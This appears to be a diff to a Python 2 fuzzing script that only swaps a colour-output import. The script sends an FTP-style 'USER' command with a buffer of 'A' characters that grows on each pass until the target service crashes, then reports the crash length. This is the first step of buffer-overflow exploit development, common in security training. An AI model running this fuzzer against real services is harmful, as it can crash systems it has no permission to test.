@@ -1,6 +1,6 @@
 import sys, socket
 from time import sleep
-import statuscc
+import coloredstatus as cs
 
 RHOST = sys.argv[1]
 RPORT = int(sys.argv[2])
@@ -15,7 +15,7 @@ while True:
         s.connect((RHOST, RPORT))
         s.recv(1024)
 
-        print statuscc.NEUTRAL + "Sending buffer with length: " + str(len(buff))
+        print cs.status + "Sending buffer with length: " + str(len(buff))
         s.send("USER " + buff + "\r\n")
         s.close()
         sleep(1)
@@ -23,5 +23,5 @@ while True:
         buff += '\x41' * 50
 
     except:
-        print statuscc.POSITIVE + "Crash occured with buffer length: " + str(len(buff) - 50)
+        print cs.good + "Crash occured with buffer length: " + str(len(buff) - 50)
         sys.exit()
